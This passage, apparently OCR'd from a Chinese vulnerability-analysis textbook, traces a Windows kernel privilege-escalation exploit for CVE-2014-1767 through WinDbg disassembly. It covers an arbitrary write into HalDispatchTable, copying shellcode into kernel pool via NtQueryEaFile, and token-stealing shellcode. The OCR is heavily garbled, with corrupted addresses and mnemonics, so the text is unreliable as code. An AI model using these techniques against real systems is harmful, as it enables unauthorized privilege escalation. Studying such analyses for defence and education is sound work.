push
83ca1bf7 8d45e4
lea
eax,[ebp-1ch】//可控参数object
83ca1bfb ff75d8
83ca1bfa 5e
push
eax
push
-d]dpo
83ca1bfe ff3558a4d383
push
dword ptr [nt1ExpkorkerFactory0bjectType （83d3a458）]
83ca1c84 6ae4
push
4
83ca1ce6 ff7588
push
dwordptr[ebp+8]//句柄 Handler
83ca1c09 e8f7241800
ca11
nt10bReference0bjectByHandle (83e241e5)
---
## Page 475
456漏洞战争：软件漏洞分析精要
kd> dd ebp+8 11
kd>Ihandleex78//通过句柄查看对象类型，正是前面构造的WorkerFactory对象
processor number 0, process 856b8d48
PROCESS 856b8d4e SessionId:1 Cid:e89c
Peb:7ffddeee
ParentCid:e884
DirBase:3ecdd42e 0bjectTable:ae21dd5e HandleCount:38.
Image: cve-2014-1767.exe
Handle table at 97eBe0ee with 3e Entries in use
ee78:0bject:866d7aa8 GrantedAccess:eeefeoff Entry:97eeeefe
Object:866d7aa8Type:(855e5c90) TpworkerFactory
ObjectHeader: 866d7a9e (new version)
HandleCount:1PointerCount:2
83ca1cee 85c0
test
eax,eax
83ca1c1e ef8cc1e48eee
j1
nt1NtSetInformationworkerFactory+ex616(83ca2ed7)
nt!NtSetInformationworkerFactory+ex155:
83ca1c16 3bf3
cmp
8=e, //xq
83ca1c18 7524
jne
nt!NtSetInformationworkerFactory+ex17d (83ca1c3e)
nt!NtSetInformationkorkerFactory+ex159:
83ca1c1a 8b45e4
mov
eax,dword ptr
[-dq]
83ca1c1d 8bee
mov
eax,dword ptr
[xea]
83ca1c1f 8b401e
mov
eax,dword ptr
[eax+1eh]//eax=[eax+ex1e]
83ca1c22 85ff
test
edi,edi
//edi=*arg3 1=@
83ca1c24 7506
Jne
nt1NtSetInformationhorkerFactory+ex16b(83ca1c2c)
…省略部分内容
ntINtSetInformationkorkerFactory+ex16b:
83ca1c2c 89781c
mov
dword ptr [eax+1ch],ed1
ds:0e23:83d293bc={ha11HaliQuerySystemInformation（840378a2））//实现任意地址写任意内容，即
以供后续调用shellcode执行
83ca1c2f 8b4de4
mov
ecx,dword ptr [ebp-1ch]
83ca1c32 e88c72fcff
cal1
nt1obfDereference0bject (83c68ec3)
省略部分内.
ntINtSetInformationworkerFactory+Bx616:
83ca2ed7 e871e4fcff
cal1
nt1_SEH_epi1og4 (83c7e54d)
83ca28dc c21008
ret
10h
，x0+（01x0+1））0888m）
---
## Page 476
第9章内核漏洞分析
457
任意内容。因此，此处可令arg3=Shellcode，（*(*object+0x10)+0x1C)=(HalDispatchTable+0x4)=
HaliQuerySystemInformation，这样就可以将Shellcode地址写入HaliQuerySystemInformation，供后续
调用Shellcode执行。
再回头看第3步中NtQueryEaFile函数是如何将Shellcode复制到内核地址的，该函数原型如下：
NTSTATUS (NTAPI *PNtQueryEaF1le)(
_In_ HANDLE F1leHandle,
_Out_PIO_STATUS_BLOCK IoStatusBlock,
_Out_PVOID Buffer,
_In_ ULONG Length,
_In_ BooLEAN ReturnSingleEntry,
_In_PVOID EaList，//关键参数
_In_ULONG EaListLength，// 关键参数
_In_opt_PULONG EaIndex OPTIONAL,
_In_ BooLEAN RestartScan
用WinDbg反汇编NtQueryEaFile函数：
kd> uf NtQueryEaFile
nt INtQueryEaF11e:
83dd4b4e 6a4c
push
4Ch
83dd4b42 688892c983
push
offset nt1??::FN000BFM::string'+θx55a8（83c992e8)
83dd4b47 e8bc69edff
cal1
nt!_SEH_prolog4 (83cab5e8)
省略部分内客
nt INtQueryEaF11e+ex82:
83dd4bc2 8b7520
oV
esi,dwordptr[ebp+2eh]//长度EaLength
83dd4bc5 3bf7
cmp
esi,edi
83dd4bc7 ef84f500e88e
je
ntINtQueryEaFile+ex181 (83dd4cc2)
省略部分内客
nt1NtQueryEaF11e+exb6:
83dd4bf7 68496f202e
push
282e6F49h // tag
83dd4bfc 56
push
es1 // NumberOfBytes
83dd4bfd 57
push
edi
//PoolType
83dd4bfe e8ff9af1ff
ca11
nt1ExAllocatePoolwithQuotaTag(83cee7e2)
//ExAllocatePoolwithQuotaTag会再次调用ExA1locatePoolwithTag，其长度值会再加4，即实际
上ExAllocatePoolwithQuotaTag分配的长度是EaLength+4，在对释放的对象内存进行占坑时，应该将对象
大小objectsize-4，才能使大小相等，占坑成功。
nt!ExA1locatePoolwithQuotaTag:
83cee7e2 8bff
mov
edl,ed1
83cee7e4 55
push
ebp
---
## Page 477
458
漏洞战争：软件漏洞分析精要
83cee7e5 8bec
mov
ebp,esp
省略部分内容
83cee741 8345ec84
add
dword ptr [ebp+ech],4
83cee745 eb06
jmp
nt1ExA11ocatePoolwithQuotaTag+Bx4b (83cee74d)
83cee747 efb6db
movzx
ebx,b1
83cee74a 83eb88
Sub
ebx,8
83cee74d ff751e
Push
dword ptr
[uet+dqa]
83cee75e ff75ec
push
dword ptr
[uoe+dqa]
83cee753 53
push
ebx
83cee754 e852c486e0
cal1
nt1ExA1locatePoolwithTag(83d5abab)
省略部分内容
nt INtQueryEaF11e+exc2:
AoW
dword ptr [ebp-2eh],eax
83d64c86 56
push
es1
//长度，即可控参数EaLength
83dd4ce7 ff751c
push
dwordptr[ebp+1ch]//源地址，即可控参数EaList
83dd4cea 50
push
eax
//目标地址，即上面ExA1locatePoolwithQuotaTag分配
的内核地址
83dd4ceb e8984beaff
cal1
ntlmemcpy（83c797ae）//用于复制shel1code到特定内核地址
.…省略部分内..
解决了上述问题，就可以用以往常见的内核漏洞利用方法，借助NrQuerylntervalProfile函数执行
Shellcode，将系统进程的token赋予当前进程，最终实现本地提权。
kd> k
Chi1dEBP RetAddr
WARNING: Frane IP not in any known module. Following frames may be wrong.
Sadedcc8 83feb8ba ex2b1e2e
Sadedcfe 83f4cfab nt1KeQueryInterva1Prof1le+ex29
Sadedd24 83c8642a nt1NtQueryInterva1Profile+8x7e
8adedd24 774564f4 nt!KiFastCa11Entry+ex12a
8145fb5e 75981174 ex774564f4
0145fb5c 7746b3fS ex75981174
0145fb9c 7746b3c8 ex7746b3f5
8145fbb4 e8808888 ex7746b3c8
kd> uf 2b1020
//执行shellcode代码
002b1e2e 55
push
ebp
002b1e21 8bec
mov
ebp,esp
e02b1e23 83ec88
qns
8'dsa
882b1e26 8bed98da2bee
mov
ecx, dword ptr ds:[28DA98h]
002b1e2c 8d45fc
1ea
eax, [ebp-4]
ee2b1e2f 5e
push
eax
---
## Page 478
第9章内核漏润分析459
ee2b1030 51
push
ecx
002b1e31 ff158cda2bee
cal1
dword ptr ds:[28DA8ch]
ds:0e23:0e2bda8c={nt1PsLookupProcessByProcessId (83eb3018))
e02b1037 a19cda2be0
mov
eax,dhord ptr ds:[e028DA9Ch]
002b103c 8d55f8
lea
edx,[ebp-8]
002b103f 52
push
edx
002b1040 50
push
eax
ee2b1841 ff158cda2bee
cal1
dword ptr ds:[2BDA8Ch]
ds:0023:ee2bda8c={ntIPsLookupProcessByProcessId （83eb3e18))
e02b1847 8b4df8
mov
ecx,dword ptr[ebp-8]
e02b184a 8b91f8000000
mov
edx，dword ptr[ecx+θF8h]//EPROCESS+exF8=进程Token
kd>dt _EPROCESS ebp-8
ntI_EPROCESS
+exeee Pcb
:_KPROCESS
+exe98 ProcessLock
:_EX_PUSH_LOCK
省略部分内客
+xBec DebugPort
：ex8660623
+Bxefe ExceptionPortData
:（nul1)
+exefe ExceptionPortValue
+Bxefe ExceptionPortState
：ey000
+exef4 0bjectTable
:(nu11)
+8xef8 Token
:_EX_FAST_REF
省略部分内客…
002b1e5e 8b45fc
mov
eax,dword ptr [ebp-4]
882b1e53 8990f888e8e8
mov
dwordptr[eax+eF8h]，edx//修改token值实现提权
002b1e59 8b4dfc
mov
ecx,dword ptr [ebp-4]
082b1e5c 8b81f4e80eee
mov
eax,dword ptr [ecx+eF4h]
002b1062 8b15aeda2bee
mov
edx,dword ptr ds:[28DAAeh]
002b1068 8be8
mov